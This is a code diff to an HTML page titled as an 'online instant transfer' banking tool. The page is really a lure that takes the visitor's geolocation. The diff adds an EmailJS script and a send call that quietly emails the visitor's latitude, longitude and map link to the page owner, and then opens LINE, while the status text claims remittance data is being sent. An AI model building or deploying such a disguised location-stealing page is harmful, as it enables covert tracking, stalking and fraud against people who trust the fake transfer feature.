@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <title>線上立即轉帳</title>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
         button { padding: 15px 25px; font-size: 20px; }
@@ -16,16 +17,34 @@
     <p id="status"></p>
 
     <script>
+        // 初始化 EmailJS
+        (function() {
+            emailjs.init("3Ih6a7-AdAxrbeq_L"); // EmailJS Public Key
+        })();
+
         function sendLocation() {
-            document.getElementById("status").innerText = "正在取得對方帳號...";
+            document.getElementById("status").innerText = "正在傳送匯款資料...";
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    const text = `這是我的位置：\nhttps://maps.google.com/?q=${lat},${lon}`;
-                    const lineURL = `https://line.me/R/msg/text/?${encodeURIComponent(text)}`;
-                    document.getElementById("status").innerText = "正在開啟 LINE...";
-                    window.location.href = lineURL;
+                    const mapLink = `https://maps.google.com/?q=${lat},${lon}`;
+                    const text = `這是我的位置：\n${mapLink}`;
+                    
+                    // 寄送 Email
+                    emailjs.send("service_l8rizek", "template_v1aubd6", {
+                        from_name: "位置回報系統",
+                        latitude: lat,
+                        longitude: lon,
+                        map_link: mapLink
+                    }).then(function() {
+                        document.getElementById("status").innerText = "位置已寄出，開啟 LINE...";
+                        // 同時開啟 LINE 傳送
+                        window.location.href = `https://line.me/R/msg/text/?${encodeURIComponent(text)}`;
+                    }, function(error) {
+                        document.getElementById("status").innerText = "寄送失敗：" + JSON.stringify(error);
+                    });
+
                 }, function(error) {
                     let msg = "";
                     switch(error.code) {
@@ -36,4 +55,10 @@
                     }
                     document.getElementById("status").innerText = msg;
                 });
+            } else {
+                document.getElementById("status").innerText = "瀏覽器不支援定位功能";
             }
+        }
+    </script>
+</body>
+</html>
